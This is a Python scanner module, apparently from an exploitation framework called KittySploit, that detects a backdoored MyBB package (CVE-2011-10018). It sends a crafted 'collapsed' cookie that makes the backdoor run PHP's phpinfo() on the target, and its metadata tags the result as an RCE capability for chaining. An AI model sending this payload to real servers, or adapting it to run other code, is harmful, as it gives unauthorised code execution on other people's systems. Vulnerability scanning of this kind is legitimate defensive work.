#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2011-10018 by sending Cookie collapsed=."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MyBB - Compromised Package Backdoor Detection (CVE-2011-10018)',
        'description': (
            'Detects CVE-2011-10018 by sending Cookie collapsed=...|phpinfo()?> and matching phpinfo title.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'mybb', 'backdoor', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-10018',
        ],
        'cve': 'CVE-2011-10018',
    }

    def run(self):
        cookie = (
            'collapsed=0%7c1%7c2%7c3%7c4%7c5%7c6%7c7%7c8%7c9%7c10%7c11%7c12%7c13%7c14%7c15'
            '%7c16%7c17%7c18%7c19%7c20%7c21%7c22%7cphpinfo()?>'
        )
        for base in ('', '/forum', '/mybb', '/forums'):
            path = f'{base}/index.php' if base else '/index.php'
            r = self.http_request(method='GET', path=path, headers={'Cookie': cookie}, allow_redirects=False)
            if r and '<title>phpinfo()' in (r.text or ''):
                self.set_info(severity='critical', reason='MyBB compromised package backdoor (CVE-2011-10018)', path=path)
                return True
        return False

